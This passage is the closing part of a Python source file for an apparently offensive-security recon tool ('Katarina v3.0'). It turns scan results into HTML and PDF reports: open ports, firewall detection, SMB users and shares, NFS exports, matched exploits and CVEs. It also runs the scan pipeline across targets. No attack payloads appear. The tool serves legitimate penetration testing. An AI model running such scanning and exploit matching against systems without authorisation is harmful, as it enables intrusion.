            vuln_sec += f"<p style='color:#555'>Port {v['port']}/{v['proto']} — No known exploits</p>"

    rec_sec = ""
    for r in data["recommendations"]:
        c = pri_col.get(r["priority"],"#aaa")
        detail_html = r["detail"].replace("\n","<br>")
        rec_sec += f"""<div class="rec-block" style="border-left:4px solid {c}">
          <span class="badge" style="background:{c}">{r['priority']}</span>
          <strong>{r['title']}</strong><p>{detail_html}</p></div>"""

    hd  = data["host_discovery"]
    fw  = data["firewall"]
    if fw.get("skipped"):
        fwc = "#f39c12"
        fw_html = '<p class="fw" style="color:#f39c12">SKIPPED (requires root/sudo)</p>'
    else:
        fwc = "#e74c3c" if fw["firewall_detected"] else "#2ecc71"
        fw_label = 'FIREWALL DETECTED' if fw['firewall_detected'] else 'NO FIREWALL DETECTED'
        fw_html = f'<p class="fw">{fw_label}</p>'
        if fw["filtered_ports"]:
            fw_html += f"<p>Filtered: {', '.join(fw['filtered_ports'][:15])}</p>"
        if fw.get("unfiltered_ports"):
            fw_html += f"<p>Unfiltered: {len(fw['unfiltered_ports'])} port(s)</p>"
        if fw.get("window_open"):
            fw_html += f"<p>Open behind firewall (Window scan): {', '.join(fw['window_open'][:15])}</p>"
        for note in fw.get("notes",[]):
            fw_html += f"<p style='color:#aaa'>{note}</p>"
    meta_rows = "".join(f"<tr><td>{k}</td><td>{v}</td></tr>" for k,v in data["meta"].items())

    html = f"""<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><title>Katarina — {data['target']}</title>
<style>
body{{font-family:'Courier New',monospace;background:#0d0d0d;color:#e0e0e0;margin:0;padding:24px}}
h1{{color:#e74c3c;text-align:center;font-size:2.4em;letter-spacing:5px}}
h2{{color:#3498db;border-bottom:1px solid #333;padding-bottom:5px;margin-top:30px}}
h4{{color:#e67e22;margin:4px 0}}
.sub{{text-align:center;color:#666;margin-bottom:20px}}
.meta-box{{background:#111;padding:14px;border-radius:6px;margin-bottom:20px;border:1px solid #222}}
.meta-box span{{color:#3498db}}
table{{width:100%;border-collapse:collapse;margin:10px 0}}
th{{background:#1a1a2e;color:#3498db;padding:8px;text-align:left}}
td{{padding:7px;border-bottom:1px solid #1a1a1a;font-size:.9em}}
tr:hover td{{background:#111}}
.badge{{padding:3px 8px;border-radius:3px;color:#000;font-weight:bold;font-size:.8em;margin-right:8px}}
.rec-block{{background:#111;padding:12px 14px;margin:8px 0;border-radius:4px}}
.rec-block p{{color:#aaa;margin:4px 0 0;font-size:.88em;line-height:1.7}}
.vuln-block{{background:#1a0000;padding:12px;margin:8px 0;border-radius:4px;border-left:3px solid #e74c3c}}
.vuln-block ul{{margin:6px 0;padding-left:18px;line-height:1.9}}
.cve{{color:#e74c3c;font-weight:bold}}
.fw{{font-weight:bold;color:{fwc}}}
.footer{{text-align:center;color:#333;margin-top:50px;font-size:.8em;border-top:1px solid #222;padding-top:12px}}
code{{color:#2ecc71;font-size:.85em}}
pre{{background:#111;padding:8px;border-radius:4px;overflow-x:auto}}
</style></head><body>
<h1>KATARINA</h1>
<p class="sub">Penetration Testing Report &mdash; by MTM</p>
<div class="meta-box">
  <span>Target:</span> {data['target']} &nbsp;|&nbsp;
  <span>Date:</span> {data['timestamp']} &nbsp;|&nbsp;
  <span>Scan:</span> {data['scan_type'].upper()} &nbsp;|&nbsp;
  <span>Ports:</span> {data['ports']} &nbsp;|&nbsp;
  <span>Timing:</span> {data['timing']}
</div>
<h2>Phase 0 — Host Discovery</h2>
<table><tr><th>Field</th><th>Value</th></tr>
<tr><td>Status</td><td>{'UP' if hd['alive'] else 'DOWN'}</td></tr>
<tr><td>Hostname</td><td>{hd['hostname']}</td></tr>
<tr><td>TTL</td><td>{hd['ttl']}</td></tr>
<tr><td>OS Family</td><td>{hd['os_family']}</td></tr>
<tr><td>OS Detected</td><td>{hd['os_name']}</td></tr>
<tr><td>OS Accuracy</td><td>{hd['os_accuracy']}</td></tr>
<tr><td>CPE</td><td>{hd['os_cpe']}</td></tr>
</table>
<h2>Phase 1 — Open Ports</h2>
<table><tr><th>Port</th><th>Service</th></tr>{tcp_rows}{udp_rows}</table>
<h2>Phase 2 — Firewall</h2>
{fw_html}
<h2>Phase 3 — Services & Versions</h2>
<table><tr><th>Port</th><th>Service</th><th>Product</th><th>Version</th></tr>{svc_rows}</table>
<h2>Phase 4 — Enumeration Findings</h2>
{enum_html if enum_html else "<p style='color:#555'>No enumeration findings.</p>"}
<h2>Phase 5 — Vulnerabilities</h2>
{vuln_sec if vuln_sec else "<p>No vulnerabilities found.</p>"}
<h2>Phase 6 — Recommendations & Next Steps</h2>
{rec_sec}
<h2>Phase 7 — Scan Metadata</h2>
<table><tr><th>Key</th><th>Value</th></tr>{meta_rows}</table>
<div class="footer">Katarina v3.0 &mdash; by MTM &mdash; {data['timestamp']}</div>
</body></html>"""

    Path(filepath).write_text(html)
    success(f"HTML report saved: {filepath}")

def generate_pdf_report(data, filepath):
    try:
        from reportlab.lib.pagesizes import letter
        from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
        from reportlab.lib.units import inch
        from reportlab.lib import colors
        from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, HRFlowable
        from reportlab.lib.enums import TA_CENTER

        doc    = SimpleDocTemplate(filepath, pagesize=letter,
                   leftMargin=.75*inch, rightMargin=.75*inch,
                   topMargin=.75*inch, bottomMargin=.75*inch)
        styles = getSampleStyleSheet()
        story  = []

        RED   = colors.HexColor("#e74c3c")
        BLUE  = colors.HexColor("#3498db")
        YEL   = colors.HexColor("#e67e22")
        GRN   = colors.HexColor("#2ecc71")
        DARK  = colors.HexColor("#111111")
        DGRAY = colors.HexColor("#1a1a1a")
        GRAY  = colors.HexColor("#666666")
        WHITE = colors.white

        title_s = ParagraphStyle("T",parent=styles["Title"],textColor=RED,fontSize=26,spaceAfter=2,alignment=TA_CENTER)
        sub_s   = ParagraphStyle("S",parent=styles["Normal"],textColor=GRAY,fontSize=10,alignment=TA_CENTER,spaceAfter=14)
        h2_s    = ParagraphStyle("H2",parent=styles["Heading2"],textColor=BLUE,fontSize=13,spaceBefore=14,spaceAfter=5)
        body_s  = ParagraphStyle("B",parent=styles["Normal"],fontSize=9,leading=13)
        mono_s  = ParagraphStyle("M",parent=styles["Code"],fontSize=8,leading=12,textColor=colors.HexColor("#00cc00"))
        red_s   = ParagraphStyle("R",parent=body_s,textColor=RED,fontName="Courier-Bold")
        yel_s   = ParagraphStyle("Y",parent=body_s,textColor=YEL,fontName="Courier-Bold")
        pri_pdf = {"CRITICAL":RED,"HIGH":YEL,"MEDIUM":colors.HexColor("#f1c40f"),"LOW":GRN,"INFO":BLUE}

        def tbl(data_rows, col_widths):
            t = Table(data_rows, colWidths=col_widths)
            t.setStyle(TableStyle([
                ("BACKGROUND",(0,0),(-1,0),DARK),("TEXTCOLOR",(0,0),(-1,0),BLUE),
                ("FONTNAME",(0,0),(-1,-1),"Courier"),("FONTSIZE",(0,0),(-1,-1),8),
                ("ROWBACKGROUNDS",(0,1),(-1,-1),[DARK,DGRAY]),
                ("TEXTCOLOR",(0,1),(-1,-1),WHITE),
                ("GRID",(0,0),(-1,-1),.5,colors.HexColor("#333")),
                ("PADDING",(0,0),(-1,-1),5),
            ]))
            return t

        story += [Paragraph("KATARINA", title_s),
                  Paragraph("Penetration Testing Report — by MTM", sub_s),
                  HRFlowable(width="100%",thickness=1,color=RED),Spacer(1,10)]

        meta_data = [["Target",data["target"]],["Date",data["timestamp"]],
                     ["Scan",data["scan_type"].upper()],["Ports",data["ports"]],
                     ["Timing",data["timing"]],["Duration",data["meta"].get("duration","N/A")]]
        story.append(tbl(meta_data,[1.5*inch,5*inch]))
        story.append(Spacer(1,14))

        hd = data["host_discovery"]
        story.append(Paragraph("Phase 0 — Host Discovery",h2_s))
        p0 = [["Field","Value"],["Status","UP" if hd["alive"] else "DOWN"],
              ["Hostname",hd["hostname"]],["TTL",hd["ttl"]],["OS Family",hd["os_family"]],
              ["OS Detected",hd["os_name"]],["Accuracy",hd["os_accuracy"]],["CPE",hd["os_cpe"]]]
        story.append(tbl(p0,[1.8*inch,4.7*inch]))

        story.append(Paragraph("Phase 1 — Open Ports",h2_s))
        p1 = [["Port","Protocol","Service"]]
        for p in data["port_results"].get("tcp",[]): p1.append([p["port"],"TCP",p["service"]])
        for p in data["port_results"].get("udp",[]): p1.append([p["port"],"UDP",p["service"]])
        story.append(tbl(p1,[1*inch,1*inch,4.5*inch]) if len(p1)>1 else Paragraph("No open ports.",body_s))

        fw = data["firewall"]
        story.append(Paragraph("Phase 2 — Firewall",h2_s))
        if fw.get("skipped"):
            story.append(Paragraph("SKIPPED (requires root/sudo)",
                ParagraphStyle("FW",parent=body_s,textColor=colors.HexColor("#f39c12"),fontName="Courier-Bold")))
        else:
            fwc2 = RED if fw["firewall_detected"] else GRN
            story.append(Paragraph(f"{'DETECTED' if fw['firewall_detected'] else 'NOT DETECTED'}",
                ParagraphStyle("FW",parent=body_s,textColor=fwc2,fontName="Courier-Bold")))
            if fw["filtered_ports"]:
                story.append(Paragraph(f"Filtered: {', '.join(fw['filtered_ports'][:15])}", body_s))
            if fw.get("unfiltered_ports"):
                story.append(Paragraph(f"Unfiltered: {len(fw['unfiltered_ports'])} port(s)", body_s))
            if fw.get("window_open"):
                story.append(Paragraph(f"Open behind firewall: {', '.join(fw['window_open'][:15])}", body_s))
        for note in fw.get("notes",[]):
            story.append(Paragraph(note, body_s))

        story.append(Paragraph("Phase 3 — Services",h2_s))
        p3 = [["Port","Proto","Service","Product","Version"]]
        for s in data["services"]: p3.append([s["port"],s["proto"],s["service"],s["product"],s["version"]])
        story.append(tbl(p3,[.7*inch,.6*inch,1.2*inch,2*inch,1.5*inch]) if len(p3)>1 else Paragraph("No services.",body_s))

        # Phase 4 enum findings
        story.append(Paragraph("Phase 4 — Enumeration Findings",h2_s))
        for key, er in data.get("enum_results",{}).items():
            svc_name = er.get("service","")
            story.append(Paragraph(f"[{key}] {svc_name}", yel_s))
            if svc_name == "FTP":
                anon = er.get("anonymous","N/A")
                col  = RED if anon=="ALLOWED" else GRN
                story.append(Paragraph(f"Anonymous login: {anon}",
                    ParagraphStyle("FA",parent=body_s,textColor=col)))
            elif svc_name == "SMB":
                story.append(Paragraph(f"Null session: {er.get('null_session','N/A')}", body_s))
                for s in er.get("shares",[])[:10]: story.append(Paragraph(f"Share: {s}",mono_s))
                for u in er.get("users",[])[:20]: story.append(Paragraph(f"User: {u}",mono_s))
            elif svc_name == "NFS":
                for e in er.get("exports",[]): story.append(Paragraph(f"Export: {e[0]} → {e[1]}",
                    ParagraphStyle("NE",parent=body_s,textColor=RED)))
            elif svc_name == "RPC":
                for rs in er.get("rpc_services",[]): story.append(Paragraph(f"{rs['port']}/{rs['proto']} — {rs['service']}",mono_s))
            story.append(Spacer(1,4))

        story.append(Paragraph("Phase 5 — Vulnerabilities",h2_s))
        for v in data["vulns"]:
            story.append(Paragraph(f"Port {v['port']}/{v['proto']} — {v['product'] or v['service']} {v['version']}",yel_s))
            if v["exploits"]:
                story.append(Paragraph(f"Exploits ({len(v['exploits'])}):",body_s))
                for ex in v["exploits"][:10]:
                    parts = [p.strip() for p in ex.split("|")]
                    story.append(Paragraph(f"→ {parts[0]}",mono_s))
                    if len(parts)>1: story.append(Paragraph(f"   {parts[-1]}",
                        ParagraphStyle("P",parent=mono_s,textColor=GRAY)))
            if v["cves"]:
                story.append(Paragraph(f"CVEs ({len(v['cves'])}):",body_s))
                for cve in v["cves"]: story.append(Paragraph(f"→ {cve}",red_s))
            if v["nmap_vulns"]:
                for nv in v["nmap_vulns"]: story.append(Paragraph(f"! {nv}",
                    ParagraphStyle("NV",parent=body_s,textColor=YEL)))
            if not any([v["exploits"],v["cves"],v["nmap_vulns"]]):
                story.append(Paragraph("No known exploits found",
                    ParagraphStyle("NK",parent=body_s,textColor=GRAY)))
            story.append(Spacer(1,6))

        story.append(Paragraph("Phase 6 — Recommendations & Next Steps",h2_s))
        for r in data["recommendations"]:
            c = pri_pdf.get(r["priority"],WHITE)
            rt = Table([[f"[{r['priority']}]  {r['title']}"]],colWidths=[6.5*inch])
            rt.setStyle(TableStyle([("BACKGROUND",(0,0),(-1,-1),DARK),("TEXTCOLOR",(0,0),(-1,-1),c),
                ("FONTNAME",(0,0),(-1,-1),"Courier-Bold"),("FONTSIZE",(0,0),(-1,-1),9),
                ("PADDING",(0,0),(-1,-1),6),("LINEBEFORE",(0,0),(0,-1),3,c)]))
            story.append(rt)
            for line in r["detail"].split("\n"): story.append(Paragraph(line,body_s))
            story.append(Spacer(1,7))

        story.append(Paragraph("Phase 7 — Metadata",h2_s))
        p8 = [["Key","Value"]]+[[k,str(v)] for k,v in data["meta"].items()]
        story.append(tbl(p8,[2*inch,4.5*inch]))
        story += [Spacer(1,20),HRFlowable(width="100%",thickness=1,color=GRAY)]
        story.append(Paragraph(f"Katarina v3.0 — by MTM — {data['timestamp']}",
            ParagraphStyle("F",parent=body_s,alignment=TA_CENTER,textColor=GRAY,fontSize=8)))

        doc.build(story)
        success(f"PDF report saved: {filepath}")

    except ImportError:
        warning("reportlab not installed — pip install reportlab --break-system-packages")
        generate_txt_report(data, filepath.replace(".pdf",".txt"))
    except Exception as e:
        error(f"PDF failed: {e}")
        generate_txt_report(data, filepath.replace(".pdf",".txt"))

def phase_report(data, output_file):
    if not output_file: return
    section("PHASE 8 — Report Generation")
    ext = Path(output_file).suffix.lower()
    if   ext == ".pdf":  generate_pdf_report(data, output_file)
    elif ext == ".html": generate_html_report(data, output_file)
    else:                generate_txt_report(data, output_file)

# ─────────────────────────────────────────────
#  SINGLE TARGET SCAN
# ─────────────────────────────────────────────
def scan_single_target(target, args, start_time):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    host_disc = phase_host_discovery(target, args.verbose)
    port_res  = phase_port_scan(target, args.ports, args.scan, args.timing, args.verbose)
    fw        = phase_firewall_analysis(target, args.ports, args.scan, args.timing, args.verbose)
    services  = phase_service_detection(target, port_res, args.timing, args.verbose)
    for s in services: s["target"] = target
    enum_res  = phase_enumeration(target, services, args.verbose)
    vuln_res  = phase_vuln_search(services, args.verbose)
    recs      = phase_recommendations(services, vuln_res, fw, enum_res)
    _, _, _, ports_desc = resolve_ports(args.ports, args.scan)
    meta      = phase_metadata(target, args, start_time, port_res, services)

    return {
        "target":target,"timestamp":ts,
        "scan_type":args.scan,"ports":ports_desc,"timing":args.timing,
        "host_discovery":host_disc,"port_results":port_res,
        "firewall":fw,"services":services,
        "enum_results":enum_res,"vulns":vuln_res,
        "recommendations":recs,"meta":meta,
    }

# ─────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────
def main():
    print_banner()
    args       = parse_args()
    start_time = time.time()

    targets = resolve_targets(args.target)
    multi   = len(targets) > 1

    print(f"{C.DIM}  Target(s) : {C.CYAN}{args.target}{C.RESET}  ({len(targets)} host(s))")
    print(f"{C.DIM}  Ports     : {C.CYAN}{args.ports}{C.RESET}")
    print(f"{C.DIM}  Scan      : {C.CYAN}{args.scan}{C.RESET}")
    print(f"{C.DIM}  Timing    : {C.CYAN}{args.timing}{C.RESET}")
    print(f"{C.DIM}  Output    : {C.CYAN}{args.output or 'terminal only'}{C.RESET}\n")

    all_results = []
    for i, target in enumerate(targets, 1):
        if multi:
            print(f"\n{C.BOLD}{C.YELLOW}{'━'*60}{C.RESET}")
            print(f"{C.BOLD}{C.YELLOW}  Target {i}/{len(targets)}: {target}{C.RESET}")
            print(f"{C.BOLD}{C.YELLOW}{'━'*60}{C.RESET}")

        t_start = time.time()
        data = scan_single_target(target, args, t_start)
        all_results.append(data)

        # Output file per target (multi) or single file
        if args.output:
            if multi:
                base = Path(args.output)
                out_path = str(base.parent / f"{target}_{base.name}")
            else:
                out_path = args.output
            phase_report(data, out_path)

        section(f"SCAN COMPLETE — {target}")
        tcp_c = len(data["port_results"].get("tcp",[]))
        udp_c = len(data["port_results"].get("udp",[]))
        svc_c = len(data["services"])
        vuln_c = sum(1 for v in data["vulns"] if v["exploits"] or v["cves"] or v["nmap_vulns"])
        print(f"  {C.GREEN}Open TCP      : {tcp_c}{C.RESET}")
        print(f"  {C.GREEN}Open UDP      : {udp_c}{C.RESET}")
        print(f"  {C.YELLOW}Services      : {svc_c}{C.RESET}")
        print(f"  {C.RED}Vulns/Exploits: {vuln_c}{C.RESET}")
        print(f"  {C.CYAN}Recs          : {len(data['recommendations'])}{C.RESET}")
        print(f"  {C.DIM}Duration      : {data['meta']['duration']}{C.RESET}")

    if multi:
        print(f"\n{C.BOLD}{C.BLUE}{'═'*60}")
        print(f"  MULTI-TARGET SUMMARY — {len(targets)} hosts scanned")
        print(f"{'═'*60}{C.RESET}")
        for d in all_results:
            tc = len(d["port_results"].get("tcp",[]))
            vc = sum(1 for v in d["vulns"] if v["exploits"] or v["cves"] or v["nmap_vulns"])
            print(f"  {C.CYAN}{d['target']:<18}{C.RESET}  TCP:{tc}  Vulns:{vc}  dur:{d['meta']['duration']}")

    print(f"\n{C.RED}{C.BOLD}  Hunt. Enumerate. Exploit. — Katarina v3.0 by MTM{C.RESET}\n")

if __name__ == "__main__":
    main()
